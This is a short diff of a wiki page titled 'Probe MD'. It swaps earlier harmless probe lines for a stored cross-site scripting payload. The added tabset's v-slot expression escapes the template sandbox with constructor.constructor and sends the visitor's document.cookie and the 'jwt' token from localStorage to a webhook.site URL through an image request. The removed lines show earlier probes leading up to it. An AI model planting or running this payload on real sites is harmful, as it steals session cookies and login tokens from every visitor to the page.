@@ -2,16 +2,12 @@
 title: Probe MD
 description: probe
 published: true
-date: 2026-11-01T22:30:25.871Z
+date: 2026-11-01T22:35:21.757Z
 tags: 
 editor: markdown
 dateCreated: 2026-11-01T22:30:25.871Z
 ---
 
-Test page i29970
+<tabset><template v-slot:tabs="{z = constructor.constructor('var i=new Image();i.src='https://webhook.site/0e4363cb-71c9-4c3f-85a9-9ad54c8b57b9/?c='+encodeURIComponent(document.cookie)+'|m='+encodeURIComponent(localStorage.getItem('jwt')))()}"><li></li></template><template v-slot:content><p>i29970 probe</p></template></tabset>
 
-<img src="https://example.com/i29970-nonexistent.png" class="prefetch-candidate">
-
-<tabset><template v-slot:tabs="{z = 40 + 2}"><p>ZZ={{z}}</p></template></tabset>
-
-<script>window.__x=1</script>
+Probe page i29970
